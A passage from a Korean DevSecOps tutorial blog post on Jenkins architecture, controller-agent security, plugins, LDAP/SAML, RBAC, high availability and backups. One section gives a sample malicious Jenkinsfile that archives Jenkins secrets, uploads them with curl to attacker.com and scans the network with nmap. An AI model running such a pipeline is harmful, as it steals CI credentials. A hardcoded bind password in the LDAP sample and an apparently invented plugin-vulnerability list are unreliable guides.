---
layout: post
title: "DevSecOps Mastery: 2주차 - Jenkins 아키텍처와 엔터프라이즈 보안"
date: 2026-02-06 09:15:00 +0900
categories: [DevSecOps, Jenkins, Security, Architecture]
tags: [Jenkins, Security, CI/CD, Master-Agent, Week2]
---

# DevSecOps Mastery: 2주차 - Jenkins 아키텍처와 엔터프라이즈 보안

지난 주, 우리는 DevSecOps의 세계에 첫 발을 내디뎠습니다. Docker 위에 Jenkins를 띄우고 첫 번째 "Hello World"를 외쳤던 그 순간을 기억하시나요? 이제는 그 기초적인 설정을 **엔터프라이즈급 운영 환경**으로 발전시킬 차례입니다.

단순히 도구를 설치하는 것은 쉽습니다. 하지만 "어떻게 안전하고 효율적으로 대규모 조직에서 운영할 것인가?"는 완전히 다른 차원의 문제입니다. 

오늘 우리는 Google, Netflix, Amazon과 같은 글로벌 기업들이 수천 개의 빌드를 매일 안전하게 처리하는 Jenkins 운영 철학과 보안 원칙을 깊이 있게 탐구해보겠습니다.

---

## 📚 목차

1. [Jenkins 아키텍처 심화 이해](#jenkins-아키텍처-심화-이해)
2. [Controller-Agent 통신과 보안 모델](#controller-agent-통신과-보안-모델)  
3. [플러그인 생태계와 관리 전략](#플러그인-생태계와-관리-전략)
4. [엔터프라이즈 보안 아키텍처](#엔터프라이즈-보안-아키텍처)
5. [고가용성과 클러스터링](#고가용성과-클러스터링)
6. [실습: 철통 보안 환경 구축](#실습-철통-보안-환경-구축)
7. [성능 최적화와 모니터링](#성능-최적화와-모니터링)
8. [실제 보안 사고 사례와 대응](#실제-보안-사고-사례와-대응)
9. [문제 해결과 트러블슈팅](#문제-해결과-트러블슈팅)
10. [2주차 심화 과제](#2주차-심화-과제)

---

## Jenkins 아키텍처 심화 이해

### Jenkins의 내부 구조: 분산 시스템의 관점

Jenkins는 본질적으로 **분산 작업 실행 시스템**입니다. 중앙 집중식 조정자(Controller)와 다수의 작업 실행자(Agent)로 구성된 마스터-워커 패턴을 따릅니다.

#### Controller (과거 Master) - 조직의 두뇌

```
Jenkins Controller 핵심 구성 요소:

┌─────────────────────────────────────┐
│            Web Interface            │  ← 사용자 인터페이스
├─────────────────────────────────────┤
│        Pipeline Scheduler           │  ← 작업 큐 관리
├─────────────────────────────────────┤
│       Agent Management              │  ← 에이전트 연결 관리
├─────────────────────────────────────┤
│      Security Framework             │  ← 인증/인가 시스템
├─────────────────────────────────────┤
│       Plugin Manager                │  ← 플러그인 생명주기
├─────────────────────────────────────┤
│      Configuration Store            │  ← XML 기반 설정 저장
└─────────────────────────────────────┘
```

**Controller의 핵심 책임:**

1. **작업 스케줄링과 큐 관리**
   - 빌드 요청이 들어오면 적절한 Agent에 할당
   - 우선순위 기반 작업 큐 관리
   - 리소스 사용량을 고려한 지능적 분산

2. **Agent 생명주기 관리**
   - Agent 연결 상태 모니터링
   - 동적 Agent 프로비저닝 (Docker, Kubernetes)
   - 장애 Agent 감지 및 작업 재할당

3. **사용자 인터페이스 서비스**
   - Web UI 렌더링
   - REST API 서비스
   - WebSocket을 통한 실시간 로그 스트리밍

4. **보안 정책 시행**
   - 사용자 인증 및 세션 관리
   - 역할 기반 접근 제어 (RBAC)
   - 보안 감사 로그 생성

#### Agent (Executor) - 실제 작업 수행자

```
Agent 실행 환경 구조:

┌─────────────────────────────────────┐
│       Agent Runtime (JVM)          │
├─────────────────────────────────────┤
│    Build Environment Setup         │  ← 도구 설치, 환경변수
├─────────────────────────────────────┤
│      Workspace Management          │  ← 소스코드 체크아웃
├─────────────────────────────────────┤
│     Build Tool Integration         │  ← Maven, Gradle, npm
├─────────────────────────────────────┤
│    Artifact & Report Upload        │  ← 결과물 Controller 전송
└─────────────────────────────────────┘
```

**Agent의 유형별 특성:**

#### 1. 영구 Agent (Permanent Agent)

```bash
# 장점
- 빠른 빌드 시작 (환경 준비 시간 없음)
- 캐시 활용으로 의존성 다운로드 최소화
- 일관된 빌드 환경

# 단점  
- 리소스 상시 점유
- 환경 오염 누적 (빌드 간 간섭)
- 확장성 제한

# 적합한 시나리오
- 24/7 빌드가 필요한 핵심 서비스
- 복잡한 빌드 환경 설정이 필요한 경우
- 네트워크 격리가 필요한 보안 민감 프로젝트
```

#### 2. 동적 Agent (Cloud Agent)

```bash
# 장점
- 필요 시에만 리소스 사용 (비용 효율성)
- 깨끗한 빌드 환경 보장
- 자동 스케일링

# 단점
- 시작 시간 오버헤드
- 네트워크 의존성
- 설정 복잡성

# 적합한 시나리오
- 간헐적 빌드가 많은 개발 환경
- 다양한 OS/환경이 필요한 멀티플랫폼 프로젝트
- 클라우드 네이티브 환경
```

#### 3. Docker Agent

```bash
# 장점
- 환경 표준화 및 재현 가능성
- 빠른 프로비저닝
- 이미지 버전 관리

# 단점  
- Docker 의존성
- 중첩된 가상화 복잡성
- 스토리지 오버헤드

# 적합한 시나리오
- 마이크로서비스 아키텍처
- 컨테이너 네이티브 워크플로
- 개발팀별 격리된 빌드 환경
```

### "Never Build on Controller" 원칙 - 심화 분석

이 원칙은 Jenkins 운영의 황금률이며, 위반 시 심각한 보안 및 성능 문제가 발생합니다.

#### 보안 관점에서의 위험성

**시나리오: 악의적 Pull Request 공격**

```groovy
// 악의적 Jenkinsfile 예시
pipeline {
    agent { label 'master' }  // ← 위험: Controller에서 실행
    
    stages {
        stage('Malicious') {
            steps {
                script {
                    // Jenkins 설정 파일 탈취
                    sh "tar -czf /tmp/jenkins-secrets.tar.gz $JENKINS_HOME/secrets/"
                    
                    // 외부로 전송
                    sh "curl -X POST -F 'file=@/tmp/jenkins-secrets.tar.gz' https://attacker.com/upload"
                    
                    // 권한 상승 시도
                    sh "sudo -l || echo 'sudo check failed'"
                    
                    // 네트워크 탐색
                    sh "nmap -sn 192.168.1.0/24"
                }
            }
        }
    }
}
```

**실제 피해 사례 분석:**

2019년 Jenkins 보안 사고에서 Controller에서 빌드를 실행한 조직들이 겪은 피해:
- Jenkins 관리자 자격증명 탈취
- 연결된 모든 Agent 시스템 접근 권한 획득
- 소스 코드 저장소 접근 토큰 유출
- 프로덕션 배포 권한 탈취

#### 성능 관점에서의 문제점

**Controller 리소스 소모 분석:**

```bash
# Controller 기본 메모리 할당 예시
JVM Heap: 2GB (최소)
├── Web UI: 400MB
├── Plugin Management: 300MB  
├── Job Configuration: 200MB
├── Agent Management: 300MB
├── Security Framework: 100MB
└── 기타 오버헤드: 700MB

# 빌드 작업이 추가될 경우
각 빌드당 추가 메모리: 200-500MB
동시 빌드 10개 = 2-5GB 추가 필요
→ 총 메모리 요구량: 4-7GB
→ GC 압박으로 인한 UI 응답성 저하
```

#### 올바른 아키텍처 설계

**권장 구조:**

```yaml
# docker-compose.yml 예시 - 분리된 아키텍처
version: '3.8'

services:
  jenkins-controller:
    image: jenkins/jenkins:lts-jdk17
    environment:
      - JAVA_OPTS=-Xmx2g -Xms1g -Djava.awt.headless=true
    ports:
      - "8080:8080"
      - "50000:50000"
    volumes:
      - jenkins_home:/var/jenkins_home
    networks:
      - jenkins-net
    deploy:
      resources:
        limits:
          memory: 3g
        reservations:
          memory: 2g

  jenkins-agent-01:
    image: jenkins/agent:latest
    environment:
      - JENKINS_URL=http://jenkins-controller:8080
      - JENKINS_AGENT_NAME=agent-01
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    networks:
      - jenkins-net
    deploy:
      resources:
        limits:
          memory: 4g
        reservations:
          memory: 2g

networks:
  jenkins-net:
    driver: bridge

volumes:
  jenkins_home:
```

---

## Controller-Agent 통신과 보안 모델

### 통신 프로토콜 심화

Jenkins Controller와 Agent 간 통신은 Java Network Launch Protocol (JNLP)를 기반으로 합니다.

#### JNLP 통신 메커니즘

```
Connection Establishment Flow:

1. Agent Discovery
   Agent → Controller (Port 50000)
   Request: "Hello, I'm agent-01, can I connect?"

2. Authentication
   Controller → Agent
   Response: "Provide your secret key"
   
   Agent → Controller  
   Secret: [SHA-256 hashed secret]

3. Capability Negotiation
   Controller ↔ Agent
   Exchange: Supported protocols, encryption methods

4. Secure Channel Setup
   Controller ↔ Agent
   Establish: TLS 1.3 encrypted channel

5. Command/Control
   Controller → Agent: Build instructions
   Agent → Controller: Status updates, logs, artifacts
```

#### 보안 레이어 분석

**1. 네트워크 보안**

```bash
# TLS 설정 최적화
JAVA_OPTS="$JAVA_OPTS -Dhudson.security.HudsonPrivateSecurityRealm.force=true"
JAVA_OPTS="$JAVA_OPTS -Djenkins.security.SSLSocketFactory.enabledProtocols=TLSv1.3"
JAVA_OPTS="$JAVA_OPTS -Djdk.tls.client.protocols=TLSv1.3"

# 약한 암호화 방식 비활성화
JAVA_OPTS="$JAVA_OPTS -Djdk.tls.disabledAlgorithms=MD5,SHA1,RC4,DES,3DES"
```

**2. 인증 메커니즘**

```groovy
// Agent 연결 인증 스크립트
import hudson.slaves.*
import jenkins.model.Jenkins

def jenkins = Jenkins.instance

// 보안 강화된 Agent 설정
def launcher = new JNLPLauncher(
    null,                    // tunnel 설정
    null,                    // vmargs  
    new RemotingWorkDirSettings(
        true,                // disabled
        "/tmp/remoting",     // workDirPath
        "TAKEOVER",          // internalDir
        true                 // failIfWorkDirIsMissing
    )
)

// Agent 생성 시 보안 옵션
def agent = new DumbSlave(
    "secure-agent-01",       // agent name
    "/home/jenkins",         // remote root directory
    launcher
)

// 라벨과 실행자 수 설정
agent.setLabelString("secure linux docker")
agent.setNumExecutors(2)

// Jenkins에 Agent 등록
jenkins.addNode(agent)
jenkins.save()
```

**3. 권한 위임과 제한**

```bash
# Agent별 권한 제한 설정
# 파일 시스템 접근 제한
--add-opens java.base/java.io=ALL-UNNAMED
--add-opens java.base/java.util.concurrent=ALL-UNNAMED

# 네트워크 접근 제한  
-Djava.net.useSystemProxies=false
-Dhttp.nonProxyHosts="localhost|127.*|[::1]"

# JVM 보안 정책
-Djava.security.policy=/etc/jenkins/agent.policy
```

### 네트워크 토폴로지와 방화벽 설정

#### 엔터프라이즈 네트워크 구성

```
Enterprise Jenkins Network Topology:

Internet
    ↓ (HTTPS/443)
┌─────────────────┐
│  Load Balancer  │ ← HAProxy/Nginx
│   (SSL Termini) │
└─────────────────┘
    ↓ (HTTP/8080)
┌─────────────────┐
│ DMZ Zone        │
│ ┌─────────────┐ │
│ │  Jenkins    │ │ ← Controller Only
│ │ Controller  │ │
│ └─────────────┘ │
└─────────────────┘
    ↓ (JNLP/50000)
┌─────────────────┐
│ Private Zone    │
│ ┌─────────────┐ │ ┌─────────────┐
│ │   Agent     │ │ │   Agent     │
│ │   Pool 1    │ │ │   Pool 2    │  
│ └─────────────┘ │ └─────────────┘
└─────────────────┘
    ↓ (Various protocols)
┌─────────────────┐
│ Secure Zone     │
│ ┌─────────────┐ │ ┌─────────────┐
│ │ Production  │ │ │ Database    │
│ │ Systems     │ │ │ Systems     │
│ └─────────────┘ │ └─────────────┘
└─────────────────┘
```

**방화벽 규칙 예시:**

```bash
# Jenkins Controller (DMZ)
iptables -A INPUT -p tcp --dport 8080 -s 10.0.1.0/24 -j ACCEPT  # LB에서만
iptables -A INPUT -p tcp --dport 50000 -s 10.0.2.0/24 -j ACCEPT # Agent에서만
iptables -A INPUT -j DROP  # 나머지 모든 트래픽 차단

# Jenkins Agent (Private Zone)  
iptables -A OUTPUT -p tcp --dport 50000 -d 10.0.1.100 -j ACCEPT # Controller만
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT                 # HTTPS 외부 접속
iptables -A OUTPUT -p tcp --dport 22 -j ACCEPT                  # SSH (관리용)
iptables -A OUTPUT -j DROP  # 나머지 모든 트래픽 차단
```

---

## 플러그인 생태계와 관리 전략

### 플러그인 아키텍처 이해

Jenkins 플러그인 시스템은 **Extension Point** 패턴을 기반으로 설계되었습니다.

#### 플러그인 생명주기

```java
// 플러그인 로딩 과정
1. Discovery Phase
   └── $JENKINS_HOME/plugins/*.hpi 스캔

2. Dependency Resolution  
   └── Manifest.MF에서 의존성 분석
   └── 순환 의존성 검사

3. Class Loading
   └── 격리된 ClassLoader 생성
   └── Plugin ClassLoader Hierarchy 구성

4. Initialization
   └── Plugin#start() 메서드 호출
   └── Extension Point 등록

5. Service Registration
   └── Jenkins Extension Registry에 서비스 등록
```

#### 플러그인 보안 모델

```groovy
// 플러그인 보안 검증 스크립트
import jenkins.model.Jenkins
import hudson.PluginManager
import hudson.PluginWrapper

def jenkins = Jenkins.instance
def pluginManager = jenkins.pluginManager

// 설치된 플러그인 보안 검사
def vulnerablePlugins = []

pluginManager.plugins.each { plugin ->
    def version = plugin.version
    def shortName = plugin.shortName
    
    // 알려진 취약 버전 체크
    def vulnerabilityDatabase = [
        'script-security': ['1.74', '1.75', '1.76'],
        'workflow-cps': ['2.87', '2.88'],
        'git': ['4.0.0', '4.1.0', '4.1.1']
    ]
    
    if (vulnerabilityDatabase[shortName]?.contains(version)) {
        vulnerablePlugins.add([
            name: shortName,
            version: version,
            status: 'VULNERABLE'
        ])
    }
}

// 보고서 생성
if (vulnerablePlugins.size() > 0) {
    println "⚠️  취약한 플러그인 발견:"
    vulnerablePlugins.each { plugin ->
        println "   ${plugin.name} v${plugin.version}"
    }
} else {
    println "✅ 알려진 취약점이 없는 플러그인 구성"
}
```

### Plugin Hell 예방 전략

#### 1. 최소 설치 원칙

**Core Plugin Set (필수 최소 구성):**

```yaml
# plugins.txt - 추천 기본 구성
# Core Functionality
ant:latest
build-timeout:latest  
credentials-binding:latest
timestamper:latest
ws-cleanup:latest

# Source Control
git:latest
github:latest

# Pipeline
workflow-aggregator:latest
pipeline-stage-view:latest
blue-ocean:latest

# Security
role-strategy:latest
matrix-auth:latest

# Notifications
email-ext:latest
slack:latest

# Testing & Quality
junit:latest
warnings-ng:latest

# Deployment
ssh-slaves:latest
docker-workflow:latest
```

**Plugin 설치 자동화:**

```bash
#!/bin/bash
# install-plugins.sh

JENKINS_HOME="/var/jenkins_home"
PLUGINS_FILE="plugins.txt"

# 플러그인 일괄 설치
jenkins-plugin-cli \
    --war /usr/share/jenkins/jenkins.war \
    --plugin-file ${PLUGINS_FILE} \
    --plugins-dir ${JENKINS_HOME}/plugins

# 의존성 검증
java -jar jenkins-plugin-cli.jar \
    --available-updates \
    --plugin-file ${PLUGINS_FILE}
```

#### 2. 의존성 관리

```groovy
// 플러그인 의존성 분석 스크립트
import jenkins.model.Jenkins
import hudson.PluginWrapper

def analyzeDependencies() {
    def jenkins = Jenkins.instance
    def dependencies = [:]
    
    jenkins.pluginManager.plugins.each { plugin ->
        def pluginName = plugin.shortName
        dependencies[pluginName] = [
            version: plugin.version,
            dependencies: plugin.manifest.mainAttributes.getValue('Plugin-Dependencies')?.split(',') ?: [],
            dependents: []
        ]
    }
    
    // 역방향 의존성 계산
    dependencies.each { pluginName, info ->
        info.dependencies.each { dep ->
            def depName = dep.split(':')[0]
            if (dependencies[depName]) {
                dependencies[depName].dependents.add(pluginName)
            }
        }
    }
    
    return dependencies
}

// 고아 플러그인 검출
def findOrphanPlugins() {
    def deps = analyzeDependencies()
    def orphans = []
    
    deps.each { name, info ->
        if (info.dependents.size() == 0 && !isEssentialPlugin(name)) {
            orphans.add(name)
        }
    }
    
    return orphans
}

def isEssentialPlugin(name) {
    def essential = [
        'workflow-aggregator', 'git', 'credentials-binding',
        'timestamper', 'ws-cleanup', 'role-strategy'
    ]
    return essential.contains(name)
}

// 실행
println "🧹 고아 플러그인 목록:"
findOrphanPlugins().each { orphan ->
    println "   - ${orphan}"
}
```

#### 3. 업데이트 관리 전략

```bash
#!/bin/bash
# plugin-update-strategy.sh

# 1단계: 테스트 환경에서 업데이트 검증
function test_plugin_updates() {
    local test_jenkins_url="http://jenkins-test:8080"
    
    # 현재 플러그인 버전 백업
    curl -s "${test_jenkins_url}/pluginManager/api/json?depth=1" \
        | jq -r '.plugins[] | "\(.shortName):\(.version)"' \
        > plugins-current.txt
    
    # 테스트 업데이트 실행
    jenkins-cli -s ${test_jenkins_url} install-plugin \
        $(cat plugins-to-update.txt)
    
    # 재시작 및 검증
    jenkins-cli -s ${test_jenkins_url} restart
    sleep 60
    
    # 헬스 체크
    if ! curl -f "${test_jenkins_url}/login" > /dev/null 2>&1; then
        echo "❌ 업데이트 후 Jenkins 시작 실패"
        return 1
    fi
    
    # 파이프라인 테스트 실행
    jenkins-cli -s ${test_jenkins_url} build "plugin-compatibility-test"
    
    echo "✅ 플러그인 업데이트 테스트 완료"
}

# 2단계: Blue-Green 배포로 프로덕션 적용
function deploy_to_production() {
    # Green 환경에 업데이트 적용
    kubectl apply -f jenkins-green-deployment.yaml
    
    # Green 환경 검증
    wait_for_green_healthy
    
    # 트래픽 전환
    kubectl patch service jenkins-service \
        -p '{"spec":{"selector":{"version":"green"}}}'
        
    # Blue 환경 정리
    kubectl delete deployment jenkins-blue
}
```

---

## 엔터프라이즈 보안 아키텍처

### 인증 시스템 통합

#### LDAP/Active Directory 연동

대부분의 기업은 중앙 집중식 사용자 디렉터리를 운영합니다. Jenkins를 기업 인증 시스템과 통합하는 방법을 살펴보겠습니다.

```groovy
// LDAP 설정 스크립트
import hudson.security.*
import jenkins.model.*
import jenkins.security.plugins.ldap.*

def instance = Jenkins.getInstance()

// LDAP 설정 구성
def ldapSecurityRealm = new LDAPSecurityRealm(
    "ldap://ad.company.com:389",        // 서버 URL
    "dc=company,dc=com",                // 루트 DN
    "cn=jenkins,ou=service,dc=company,dc=com", // 바인드 DN
    "password123",                      // 바인드 패스워드
    "sAMAccountName={0}",              // 사용자 검색 필터
    "cn",                              // 사용자 검색 베이스
    "member={0}",                      // 그룹 검색 필터  
    new FromGroupSearchLDAPGroupMembershipStrategy("") // 그룹 멤버십 전략
)

// SSL/TLS 설정
ldapSecurityRealm.disableCertificateCheck = false
ldapSecurityRealm.disableRolePrefixing = true

// LDAP 캐시 설정 (성능 최적화)
ldapSecurityRealm.cache = new LDAPSecurityRealm.CacheConfiguration(
    600,    // 캐시 지속시간 (초)
    100     // 최대 캐시 항목 수
)

// Jenkins에 보안 설정 적용
instance.setSecurityRealm(ldapSecurityRealm)
instance.save()

println "✅ LDAP 인증이 구성되었습니다."
```

#### SAML SSO 통합

```groovy
// SAML 2.0 SSO 설정
import org.jenkinsci.plugins.saml.*

def samlSecurityRealm = new SamlSecurityRealm(
    "https://sso.company.com/idp/metadata.xml",  // IdP 메타데이터 URL
    "urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect", // 바인딩
    "jenkins.company.com",                        // SP Entity ID
    "https://jenkins.company.com/securityRealm/finishLogin", // ACS URL
    "email",                                     // 사용자명 속성
    "cn",                                        // 표시명 속성  
    "mail",                                      // 이메일 속성
    "memberOf",                                  // 그룹 속성
    86400,                                       // 세션 타임아웃 (초)
    false,                                       // 암호화 요청
    ""                                           // 인증서 경로
)

Jenkins.instance.setSecurityRealm(samlSecurityRealm)
Jenkins.instance.save()
```

### 역할 기반 접근 제어 (RBAC) 설계

#### 권한 매트릭스 설계

```yaml
# 엔터프라이즈 권한 매트릭스
roles:
  # 관리자 역할
  jenkins-admin:
    permissions:
      - overall: [administer, read, runScripts]
      - credentials: [create, delete, manageDomains, update, view]
      - job: [build, cancel, configure, create, delete, discover, read, workspace]
      - view: [configure, create, delete, read]
      - run: [delete, replay, update]
      - metrics: [health, view]
    
  # DevOps 엔지니어 역할  
  devops-engineer:
    permissions:
      - overall: [read]
      - credentials: [view]
      - job: [build, cancel, configure, create, read, workspace]
      - view: [configure, create, read]
      - run: [delete, update]
      - metrics: [view]
    
  # 개발자 역할
  developer:
    permissions:
      - overall: [read]
      - job: [build, cancel, read, workspace]
      - view: [read]
      - run: [update]
    
  # 읽기 전용 (매니저, QA)
  viewer:
    permissions:
      - overall: [read]
      - job: [read]
      - view: [read]
```

#### 프로젝트별 권한 분리

```groovy
// 프로젝트별 권한 설정
import nectar.plugins.rbac.*
import hudson.security.*

def strategy = new RoleBasedAuthorizationStrategy()

// 글로벌 역할
strategy.addRole(RoleType.Global, new Role("admin", 
    Permission.fromId("hudson.model.Hudson.Administer")))
    
strategy.addRole(RoleType.Global, new Role("authenticated", 
    Permission.fromId("hudson.model.Hudson.Read")))

// 프로젝트별 역할
def projectPatterns = [
    "frontend-.*": ["frontend-team", "devops-team"],
    "backend-.*": ["backend-team", "devops-team"], 
    "mobile-.*": ["mobile-team", "devops-team"],
    "infra-.*": ["devops-team"]
]

projectPatterns.each { pattern, teams ->
    teams.each { team ->
        def roleName = "${team}-${pattern.replace('.*', '')}"
        strategy.addRole(RoleType.Project, new Role(roleName, 
            Permission.fromId("hudson.model.Item.Build"),
            Permission.fromId("hudson.model.Item.Read"),
            Permission.fromId("hudson.model.Item.Workspace")), 
            [pattern] as Set)
    }
}

Jenkins.instance.setAuthorizationStrategy(strategy)
Jenkins.instance.save()
```

### 보안 감사와 로깅

#### 감사 로그 설정

```groovy
// 상세 감사 로깅 구성
import java.util.logging.*

def loggers = [
    'hudson.security.SecurityRealm': Level.FINE,
    'hudson.security.AuthorizationStrategy': Level.FINE,
    'jenkins.security.apitoken.ApiTokenAuthenticator': Level.FINE,
    'hudson.security.csrf.DefaultCrumbIssuer': Level.FINE,
    'org.jenkinsci.plugins.scriptsecurity.sandbox': Level.FINE
]

loggers.each { logger, level ->
    Logger.getLogger(logger).level = level
}

// 보안 이벤트 커스텀 로거
def securityLogger = Logger.getLogger("jenkins.security.audit")
securityLogger.addHandler(new FileHandler("/var/log/jenkins/security-audit.log"))
securityLogger.level = Level.INFO

println "✅ 보안 감사 로깅이 구성되었습니다."
```

#### 실시간 보안 모니터링

```bash
#!/bin/bash
# security-monitor.sh

# 의심스러운 로그인 시도 감지
tail -f /var/log/jenkins/jenkins.log | while read line; do
    if echo "$line" | grep -q "Failed to authenticate"; then
        # 실패한 인증 시도 추출
        user=$(echo "$line" | sed -n 's/.*user \([^[:space:]]*\).*/\1/p')
        ip=$(echo "$line" | sed -n 's/.*from \([0-9.]*\).*/\1/p')
        
        # 임계값 확인 (1분 내 5회 실패)
        recent_failures=$(grep "Failed to authenticate.*$user.*$ip" /var/log/jenkins/jenkins.log | 
                         grep "$(date '+%Y-%m-%d %H:%M')" | wc -l)
        
        if [ $recent_failures -ge 5 ]; then
            # Slack 알림
            curl -X POST -H 'Content-type: application/json' \
                --data "{\"text\":\"🚨 브루트포스 공격 탐지: $user@$ip ($recent_failures attempts)\"}" \
                $SLACK_WEBHOOK_URL
                
            # IP 차단 (선택적)
            iptables -A INPUT -s $ip -j DROP
        fi
    fi
done
```

---

## 고가용성과 클러스터링

### Jenkins 고가용성 아키텍처

엔터프라이즈 환경에서 Jenkins는 단일 장애점(Single Point of Failure)이 될 수 없습니다.

#### Active-Passive 클러스터링

```yaml
# Kubernetes를 이용한 HA 구성
apiVersion: apps/v1
kind: StatefulSet
metadata:
  name: jenkins-ha
spec:
  serviceName: jenkins-ha
  replicas: 2  # Active-Passive
  selector:
    matchLabels:
      app: jenkins-ha
  template:
    metadata:
      labels:
        app: jenkins-ha
    spec:
      initContainers:
      - name: jenkins-data-permission-fix
        image: busybox
        command: ["chown", "-R", "1000:1000", "/var/jenkins_home"]
        volumeMounts:
        - name: jenkins-data
          mountPath: /var/jenkins_home
          
      containers:
      - name: jenkins
        image: jenkins/jenkins:lts-jdk17
        env:
        - name: JENKINS_OPTS
          value: "--prefix=/jenkins"
        - name: JAVA_OPTS
          value: >
            -Xmx2g 
            -Xms2g
            -Djenkins.install.runSetupWizard=false
            -Djenkins.security.ApiTokenProperty.adminCanGenerateNewTokens=false
            -Dhudson.security.csrf.DefaultCrumbIssuer.EXCLUDE_SESSION_ID=true
        ports:
        - containerPort: 8080
        - containerPort: 50000
        volumeMounts:
        - name: jenkins-data
          mountPath: /var/jenkins_home
        - name: jenkins-config
          mountPath: /usr/share/jenkins/ref/
          
        # 헬스체크
        livenessProbe:
          httpGet:
            path: /jenkins/login
            port: 8080
          initialDelaySeconds: 120
          periodSeconds: 30
          
        readinessProbe:
          httpGet:
            path: /jenkins/login  
            port: 8080
          initialDelaySeconds: 60
          periodSeconds: 10
          
        # 리소스 제한
        resources:
          requests:
            memory: "2Gi"
            cpu: "1000m"
          limits:
            memory: "4Gi"
            cpu: "2000m"
            
      volumes:
      - name: jenkins-config
        configMap:
          name: jenkins-config

  volumeClaimTemplates:
  - metadata:
      name: jenkins-data
    spec:
      accessModes: ["ReadWriteOnce"]
      resources:
        requests:
          storage: 100Gi
      storageClassName: fast-ssd
```

#### 로드 밸런서 설정

```nginx
# nginx.conf for Jenkins HA
upstream jenkins_backend {
    # Primary Jenkins instance
    server jenkins-0.jenkins-ha.default.svc.cluster.local:8080 weight=100 max_fails=3 fail_timeout=30s;
    
    # Backup Jenkins instance (normally down)
    server jenkins-1.jenkins-ha.default.svc.cluster.local:8080 weight=1 max_fails=1 fail_timeout=30s backup;
}

server {
    listen 80;
    server_name jenkins.company.com;
    
    # HTTPS 리다이렉트
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name jenkins.company.com;
    
    # SSL 설정
    ssl_certificate /etc/ssl/certs/jenkins.company.com.crt;
    ssl_certificate_key /etc/ssl/private/jenkins.company.com.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE+AESGCM:ECDHE+AES256:ECDHE+AES128:!aNULL:!MD5:!DSS;
    
    # 보안 헤더
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    add_header X-Frame-Options SAMEORIGIN always;
    add_header X-Content-Type-Options nosniff always;
    
    # Jenkins 프록시 설정
    location /jenkins {
        proxy_pass http://jenkins_backend;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # WebSocket 지원 (실시간 로그용)
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        
        # 타임아웃 설정
        proxy_connect_timeout 60s;
        proxy_send_timeout 60s;
        proxy_read_timeout 60s;
        
        # 큰 파일 업로드 지원
        client_max_body_size 100M;
    }
    
    # 헬스체크 엔드포인트
    location /health {
        proxy_pass http://jenkins_backend/jenkins/login;
        access_log off;
    }
}
```

### 데이터 백업과 복구

#### 자동 백업 시스템

```bash
#!/bin/bash
# jenkins-backup.sh

set -euo pipefail

# 설정
JENKINS_HOME="/var/jenkins_home"
BACKUP_DIR="/backup/jenkins"
S3_BUCKET="company-jenkins-backups"
RETENTION_DAYS=30

# 백업 생성
create_backup() {
    local backup_date=$(date +"%Y%m%d_%H%M%S")
    local backup_path="${BACKUP_DIR}/jenkins_backup_${backup_date}"
    
    echo "🔄 Jenkins 백업 시작: $backup_date"
    
    # Jenkins 서비스 일시 정지 (선택적)
    # kubectl scale statefulset jenkins-ha --replicas=0
    
    # 중요 디렉터리만 백업 (선별적 백업)
    mkdir -p "$backup_path"
    
    # 설정 파일들
    cp -r "${JENKINS_HOME}/config.xml" "$backup_path/"
    cp -r "${JENKINS_HOME}/credentials.xml" "$backup_path/"
    cp -r "${JENKINS_HOME}/jobs" "$backup_path/"
    cp -r "${JENKINS_HOME}/users" "$backup_path/"
    cp -r "${JENKINS_HOME}/secrets" "$backup_path/"
    cp -r "${JENKINS_HOME}/plugins" "$backup_path/"
    
    # 압축
    tar -czf "${backup_path}.tar.gz" -C "$BACKUP_DIR" "jenkins_backup_${backup_date}"
    rm -rf "$backup_path"
    
    # S3 업로드
    aws s3 cp "${backup_path}.tar.gz" "s3://${S3_BUCKET}/$(date +%Y/%m/%d)/"
    
    echo "✅ 백업 완료: ${backup_path}.tar.gz"
    
    # Jenkins 서비스 재개
    # kubectl scale statefulset jenkins-ha --replicas=2
}

# 오래된 백업 정리
cleanup_old_backups() {
    echo "🧹 ${RETENTION_DAYS}일 이전 백업 정리 중..."
    
    # 로컬 백업 정리
    find "$BACKUP_DIR" -name "jenkins_backup_*.tar.gz" \
        -type f -mtime +${RETENTION_DAYS} -delete
    
    # S3 백업 정리
    aws s3api list-objects-v2 --bucket "$S3_BUCKET" \
        --query "Contents[?LastModified<='$(date -d "${RETENTION_DAYS} days ago" --iso-8601)'].Key" \
        --output text | while read key; do
            aws s3 rm "s3://${S3_BUCKET}/${key}"
    done
}

# 백업 검증
verify_backup() {
    local backup_file="$1"
    
    echo "🔍 백업 파일 검증 중..."
    
    # 압축 파일 무결성 검사
    if ! tar -tzf "$backup_file" > /dev/null; then
        echo "❌ 백업 파일이 손상되었습니다: $backup_file"
        return 1
    fi
    
    # 필수 파일 존재 확인
    local required_files=("config.xml" "jobs" "users" "secrets")
    for file in "${required_files[@]}"; do
        if ! tar -tzf "$backup_file" | grep -q "$file"; then
            echo "❌ 필수 파일 누락: $file"
            return 1
        fi
    done
    
    echo "✅ 백업 검증 완료"
    return 0
}

# 복구 함수
restore_backup() {
    local backup_file="$1"
    local restore_path="/tmp/jenkins_restore"
    
    echo "🔄 Jenkins 복구 시작..."
    
    # 백업 검증
    if ! verify_backup "$backup_file"; then
        echo "❌ 백업 검증 실패"
        return 1
    fi
    
    # Jenkins 정지
    kubectl scale statefulset jenkins-ha --replicas=0
    sleep 30
    
    # 기존 데이터 백업
    mv "$JENKINS_HOME" "${JENKINS_HOME}.old.$(date +%Y%m%d_%H%M%S)"
    
    # 복구 실행
    mkdir -p "$JENKINS_HOME"
    tar -xzf "$backup_file" -C "/tmp/"
    cp -r "$restore_path"/* "$JENKINS_HOME/"
    
    # 권한 수정
    chown -R 1000:1000 "$JENKINS_HOME"
    
    # Jenkins 재시작
    kubectl scale statefulset jenkins-ha --replicas=2
    
    echo "✅ 복구 완료"
    
    # 임시 파일 정리
    rm -rf "$restore_path"
}

# 스케줄링 (cron에서 호출)
main() {
    case "${1:-backup}" in
        backup)
            create_backup
